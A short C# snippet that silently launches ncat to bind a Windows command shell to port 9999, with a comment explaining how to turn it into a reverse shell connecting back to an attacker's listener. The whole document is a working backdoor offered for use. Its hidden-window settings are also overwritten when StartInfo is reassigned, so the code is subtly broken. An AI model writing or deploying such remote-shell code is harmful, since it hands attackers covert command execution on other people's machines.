using System.Diagnostics;

Process ncat = new Process();
ncat.StartInfo.CreateNoWindow = true;
ncat.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
ncat.StartInfo.UseShellExecute = false;
ncat.StartInfo = new ProcessStartInfo("ncat.exe", "-lknp 9999 -e cmd.exe");
/* You can also change this to something simillar to: 
"0.0.0.0 9999 -e cmd.exe" (or "-e /bin/bash" for Linux) to make the machine you want to connect to connect back to you, instead of the other way around. 
Note: If you choose this method, you must first set your host machine to listen on the desired port (* you can set any port or ip address you want) and then initiate the script. 
*/
ncat.Start();